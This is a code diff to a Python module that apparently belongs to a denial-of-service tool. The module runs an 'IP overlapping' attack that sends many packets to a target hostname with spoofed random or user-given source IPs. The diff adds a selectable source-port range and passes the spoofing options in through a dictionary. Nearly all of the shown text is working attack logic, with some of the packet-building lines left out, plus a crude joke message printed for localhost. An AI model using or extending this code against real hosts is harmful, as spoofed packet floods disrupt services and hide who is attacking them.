@@ -31,19 +31,26 @@ def randInt():
     x = random.randint(1,65535) # TCP ports
     return x
 
-def overlapize(ip, sport, rounds, source=None):
+def randPort(start, end):
+    x = random.randint(start, end)
+    return x
+
+def overlapize(ip, sport, rounds, address_dict):
     n=0
     try:
         for x in range (0,int(rounds)):
             n=n+1
-            s_zombie_port = randInt() 
+            if address_dict['start'] is not None and address_dict['end'] is not None:
+                s_zombie_port = randPort(int(address_dict['start']), int(address_dict['end']))
+            else:
+                s_zombie_port = randInt() 
             IP_p = IP()
-            if source is None:
+            if address_dict['source'] is None:
                 print("[Info] [OVERLAP] Using random source IP")
                 IP_p.src = randIP()
             else:
                 print("[Info] [OVERLAP] Using given source IP")
-                IP_p.src = source
+                IP_p.src = address_dict['source']
             try:
                 IP_p.dst = ip
             except:
@@ -62,7 +69,7 @@ def overlapize(ip, sport, rounds, source=None):
         print("[Error] [AI] [OVERLAP] Failing to engage... -> Is still target online? -> [Checking!]")
 
 class OVERLAP(object):
-    def attacking(self, target, rounds, source=None):
+    def attacking(self, target, rounds, address_dict):
         print("[Info] [AI] 'IP OVERLAPPING' (OVERLAPGER) is ready to fire: [" , rounds, "deuterium gravitons ]")
         if target.startswith('http://'):
             target = target.replace('http://','')
@@ -86,4 +93,4 @@ class OVERLAP(object):
         if ip == "127.0.0.1" or ip == "localhost":
             print("[Info] [AI] [OVERLAP] Sending message '1/0 %====D 2 Ur ;-0' to 'localhost' -> [OK!]\n")
             return
-        overlapize(ip, sport, rounds, source) # attack with OVERLAP using threading
+        overlapize(ip, sport, rounds, address_dict) # attack with OVERLAP using threading
